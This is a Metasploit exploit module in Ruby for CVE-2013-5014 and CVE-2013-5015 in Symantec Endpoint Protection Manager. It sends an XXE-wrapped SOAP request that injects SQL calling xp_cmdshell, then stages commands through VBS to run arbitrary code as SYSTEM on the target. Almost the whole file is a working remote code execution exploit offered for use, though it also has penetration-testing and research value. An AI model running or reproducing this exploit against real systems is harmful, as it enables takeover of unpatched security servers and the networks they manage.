# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;msf/core/exploit/powershell&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include REXML
  include Msf::Exploit::CmdStagerVBS
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Symantec Endpoint Protection Manager Remote Command Execution&#039;,
      &#039;Description&#039;    => %q{
        This module exploits XXE and SQL injection flaws in Symantec Endpoint Protection Manager
        versions 11.0, 12.0 and 12.1. When supplying a specially crafted XXE request an attacker
        can reach SQL injection affected components. As xp_cmdshell is enabled in the included
        database instance, it&#039;s possible to execute arbitrary system commands on the remote system
        with SYSTEM privileges.
      },
      &#039;Author&#039;         =>
        [
          &#039;Stefan Viehbock&#039;, # Discovery
          &#039;Chris Graham&#039;, # PoC exploit
          &#039;xistence <xistence[at]0x90.nl>&#039; # Metasploit module
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [ &#039;CVE&#039;, &#039;2013-5014&#039; ],
          [ &#039;CVE&#039;, &#039;2013-5015&#039; ],
          [ &#039;EDB&#039;, &#039;31853&#039;],
          [ &#039;URL&#039;, &#039;https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20140218-0_Symantec_Endpoint_Protection_Multiple_critical_vulnerabilities_wo_poc_v10.txt&#039; ]
        ],
      &#039;Arch&#039;           => ARCH_X86,
      &#039;Platform&#039;       => &#039;win&#039;,
      &#039;Targets&#039;        =>
        [
          [&#039;Windows VBS Stager&#039;, {}]
        ],
      &#039;Privileged&#039;     => true,
      &#039;DisclosureDate&#039; => &#039;Feb 24 2014&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        Opt::RPORT(9090),
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The base path&#039;, &#039;/&#039;])
      ], self.class)
  end

  def check
    res = send_request_cgi(
      {
        &#039;uri&#039;   =>  normalize_uri(target_uri.path),
        &#039;method&#039; => &#039;GET&#039;,
      })

    if res && res.code == 200 && res.body =~ /Symantec Endpoint Protection Manager/ && res.body =~ /1995 - 2013 Symantec Corporation/
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    print_status("#{peer} - Sending payload")
    # Execute the cmdstager, max length of the commands is ~3950
    execute_cmdstager({:linemax => 3950})
  end

  def execute_command(cmd, opts = {})
    # Convert the command data to hex, so we can use that in the xp_cmdshell. Else characters like &#039;>&#039; will be harder to bypass in the XML.
    command = "0x#{Rex::Text.to_hex("cmd /c #{cmd}", &#039;&#039;)}"

    # Generate random &#039;xx032xxxx&#039; sequence number.
    seqnum = "#{rand_text_numeric(2)}032#{rand_text_numeric(4)}"

    soap = soap_request(seqnum, command)

    post_data = Rex::MIME::Message.new
    post_data.add_part(soap, "text/xml", nil, "form-data; name=\"Content\"")
    xxe = post_data.to_s

    res = send_request_cgi(
      {
        &#039;uri&#039; => normalize_uri(target_uri.path, &#039;servlet&#039;, &#039;ConsoleServlet&#039;),
        &#039;method&#039; => &#039;POST&#039;,
        &#039;vars_get&#039; => { &#039;ActionType&#039; => &#039;ConsoleLog&#039; },
        &#039;ctype&#039;  => "multipart/form-data; boundary=#{post_data.bound}",
        &#039;data&#039; => xxe,
      })

    if res and res.body !~ /ResponseCode/
      fail_with(Failure::Unknown, "#{peer} - Something went wrong.")
    end
  end

  def soap_request(seqnum, command)
    randpayload = rand_text_alpha(8+rand(8))
    randxxe = rand_text_alpha(8+rand(8))
    entity = "<!ENTITY #{randpayload} SYSTEM \"http://127.0.0.1:9090/servlet/ConsoleServlet?"
    entity << "ActionType=ConfigServer&action=test_av&SequenceNum=#{seqnum}&Parameter=&#039;;call xp_cmdshell(#{command});--\" >"

    xml = Document.new
    xml.add(DocType.new(&#039;sepm&#039;, "[ METASPLOIT ]"))
    xml.add_element("Request")
    xxe = xml.root.add_element(randxxe)
    xxe.text = "PAYLOAD"

    xml_s = xml.to_s
    xml_s.gsub!(/METASPLOIT/, entity) # To avoid html encoding
    xml_s.gsub!(/PAYLOAD/, "&#{randpayload};") # To avoid html encoding

    xml_s
  end

end

